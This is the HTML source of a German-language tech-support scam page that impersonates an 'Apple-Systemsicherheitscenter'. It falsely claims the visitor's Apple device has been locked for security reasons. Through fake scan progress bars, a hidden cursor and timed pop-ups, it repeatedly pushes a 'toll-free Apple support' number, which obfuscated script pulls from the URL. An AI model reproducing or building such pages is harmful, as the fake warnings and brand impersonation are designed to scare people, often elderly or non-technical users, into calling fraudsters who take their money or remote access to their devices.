...
<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    ...
    <title>System Security Center Code0x268d3-Dienste</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="chat2.css">
    <script>
        function dsadwqdqwfqweqweqeq(name)
        {
        ...
        var phone = dsadwqdqwfqweqweqeq('phone');
    </script>
...
<div id="chat-box" class="bounce3" style="cursor:none;">
        ...
        margin-left: 6px;
        position: relative;
        top: 5px;">Apple</span> <p style="font-weight: 600;">Wenden Sie sich an die (gebührenfreie) Nummer des Apple-Supports:</p>
...
<div id="pprettwsauiyu">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Apple-Systemsicherheitscenter</span>
    ...
    <div id="disclaimer">
        Der Zugriff auf dieses Apple-Gerät wurde aus Sicherheitsgründen gesperrt.<br>
        <span class="support">Apple kontaktieren (gebührenfrei): <script>document.write(phone)</script></span>
    </div>
    <div id="bottom">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
   <img src="new-scan-white.jpg" class="img-fluid">
    ...
    position: absolute;
    bottom: 46px;
    left: 42px;">Wenden Sie sich an die (gebührenfreie) Apple-Nummer:<strong>
 ...
 <div id="footer">
    ...
    padding-left: 0px;
    color: #fff;
    font-size: 23px;">Wenden Sie sich an die gebührenfreie Apple-Nummer: <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;    margin-right: 4px;"><script>document.write(phone)</script> </span> </span>
    <p>&nbsp;</p>
            </div>
        </div>
...
<script type="text/javascript">
    $(function () {
        var ddasdqwqfqwrrewgfdvx = 0;
        var interval = setInterval(function () {
            ddasdqwqfqwrrewgfdvx += 10;
            $("#dynamic")
                .css("width", ddasdqwqfqwrrewgfdvx + "%")
                .attr("aria-valuenow", ddasdqwqfqwrrewgfdvx)
                .text(ddasdqwqfqwrrewgfdvx + "% Complete");
            if (ddasdqwqfqwrrewgfdvx >= 100)
...
<script type="text/javascript">
    $(document).ready(function () {
        ...
        $("#pprettwsauiyu").delay(1).fadeIn(800);
